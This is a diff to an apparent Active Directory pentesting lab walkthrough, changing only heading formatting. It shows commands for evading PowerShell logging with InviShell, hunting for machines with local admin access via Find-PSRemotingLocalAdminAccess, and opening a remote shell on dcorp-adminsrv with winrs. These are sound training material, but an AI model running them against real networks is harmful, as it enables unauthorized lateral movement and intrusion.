@@ -161,7 +161,7 @@ Invoke-PrivescCheck
 {% tabs %}
 
 ## Hunt for Local Admin access
-### Now for the next task, to identify a machine in the domain where studentx has local administrative access, use Find-PSRemotingLocalAdminAccess.ps1:
+Now for the next task, to identify a machine in the domain where studentx has local administrative access, use Find-PSRemotingLocalAdminAccess.ps1:
 
 ```batch
 C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
@@ -171,8 +171,7 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
 Find-PSRemotingLocalAdminAccess
 ```
-
-### So, studentx has administrative access on dcorp-adminsrv and on the student machine. We can connect to dcorp-adminsrv using winrs as the student user:
+So, studentx has administrative access on dcorp-adminsrv and on the student machine. We can connect to dcorp-adminsrv using winrs as the student user:
 
 ```batch
 winrs -r:dcorp-adminsrv cmd
